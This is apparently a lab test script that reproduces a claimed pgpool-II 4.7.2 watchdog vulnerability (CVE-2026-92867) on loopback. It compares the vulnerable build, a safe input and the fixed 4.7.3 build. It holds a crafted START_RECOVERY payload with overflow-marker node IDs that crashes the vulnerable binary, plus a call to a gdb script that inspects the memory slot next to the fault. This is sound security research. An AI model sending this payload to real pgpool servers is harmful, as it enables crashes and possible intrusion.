#!/bin/bash
# W2: -O2 build hypothesis for CVE-2026-92867 wire reach and adjacent-slot
# steering. Loopback-only synthetic watchdog peer against real plant-built
# pgpool binaries. Prerequisite: bash lab/pgpool2shell/wire/build-o2.sh.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
WORK="${TMPDIR:-/tmp}/w2-pgpool-o2"
VULN="$WORK/pgpool-II-4.7.2/src/pgpool"
FIXED="$WORK/pgpool-II-4.7.3/src/pgpool"

# Do NOT kill processes holding the ports: the witness may be replaying its
# own pgpool there. Refuse to run if the ports are busy; retry later.
if ss -ltn 2>/dev/null | grep -qE ':(19003|19004|19005)\b'; then
    echo "watchdog ports busy (possibly witness replay); retry later" >&2
    exit 3
fi
if [ ! -x "$VULN" ] || [ ! -x "$FIXED" ]; then
    echo "build first: bash lab/pgpool2shell/wire/build-o2.sh" >&2
    exit 2
fi
printf '0\n' > "$HERE/pgpool_node_id"

run_case() {
    local bin="$1" tag="$2" n="$3"
    local json="{\"Function\":\"START_RECOVERY\",\"Flags\":0,\"NodeCount\":$n,\"NodeIdList\":[1094795585,1111638594]}"
    local out="$HERE/evidence-o2-$tag"
    rm -f "$out.stdout" "$out.peer"
    python3 "$HERE/peer.py" 19005 "$json" >"$out.peer" 2>&1 &
    local peer=$!
    sleep 0.3
    "$bin" -n -D -f "$HERE/pgpool-vuln.conf" >"$out.stdout" 2>&1 &
    local pgpool=$!
    sleep 5
    local recv crash
    recv=$(grep -c 'watchdog received online recovery request' "$out.stdout" || true)
    crash=$(grep -c 'was terminated by segmentation fault' "$out.stdout" || true)
    echo "TAG=$tag N=$n BUILD=O2 received_recovery=$recv segfault_lines=$crash"
    kill "$pgpool" 2>/dev/null || true
    sleep 1
    kill -9 "$pgpool" 2>/dev/null || true
    kill "$peer" 2>/dev/null || true
    wait 2>/dev/null || true
}

echo "=== O2 A: pinned 4.7.2 -O2, NodeCount=2 ==="
run_case "$VULN" vuln-n2 2
echo "=== O2 B: pinned 4.7.2 -O2, NodeCount=1 (safe input) ==="
run_case "$VULN" vuln-n1 1
echo "=== O2 C: pinned 4.7.3 -O2, NodeCount=2 (fixed control) ==="
run_case "$FIXED" fixed-n2 2

echo "=== O2 gdb: adjacent slot at the real parser fault (paired peer) ==="
bash "$HERE/gdb-o2-run.sh"
